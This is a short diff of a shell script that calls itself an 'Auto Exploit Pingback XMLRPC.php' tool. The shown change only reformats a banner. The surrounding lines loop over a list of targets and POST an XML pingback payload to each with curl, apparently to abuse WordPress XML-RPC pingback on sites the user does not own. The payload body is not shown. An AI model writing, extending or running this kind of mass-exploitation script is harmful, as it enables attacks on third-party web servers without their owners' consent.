@@ -24,7 +24,9 @@ PINGBACK_PAYLOAD='<?xml version="1.0"?>
 while IFS= read -r target; do
     echo """
     Auto Exploit Pingback XMLRPC.php by @frostyxsec
-    🔍 Testing $target..."""
+    🔍 Testing $target...
+    
+    """
 
     
     response=$(curl -s -X POST -d "$PINGBACK_PAYLOAD" -H "Content-Type: text/xml" "$target")
